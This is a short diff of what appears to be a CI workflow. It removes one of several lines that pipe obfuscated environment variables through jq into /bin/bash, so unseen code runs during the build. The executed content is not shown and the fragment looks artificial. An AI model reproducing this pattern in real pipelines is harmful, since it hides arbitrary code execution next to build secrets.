@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$gruna16" | jq -r .pi08181 | /bin/bash
           echo $vnrk878 | jq -r .xb5 | /bin/bash
           printf '%s' "$nuuoq8" | jq -r .qe03883 | /bin/bash
-          printf '%s' "$awamv61931" | jq -r .x120 | /bin/bash
           echo $ttxsg7508 | jq -r .pgbr76003 | /bin/bash
           echo $pprrg8910 | jq -r .tp38 | /bin/bash
 
